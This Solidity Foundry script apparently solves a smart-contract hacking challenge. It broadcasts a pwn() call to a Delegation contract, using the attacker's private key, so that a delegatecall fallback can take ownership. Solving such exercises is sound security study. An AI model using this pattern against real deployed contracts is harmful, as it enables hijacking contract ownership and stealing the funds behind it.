// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Script} from "forge-std/Script.sol";
import {Delegation} from "../src/Delegation.sol";

contract DelegationAttack is Script{
  function run() public{
    address delegationAddress = vm.envAddress("VICTIM_CONTRACT_INSTANCE");
    Delegation delegation = Delegation(delegationAddress);

    uint256 attackerPK = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(attackerPK);

    // Attack
    (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
    if(!success) revert();

    vm.stopBroadcast();
  }
}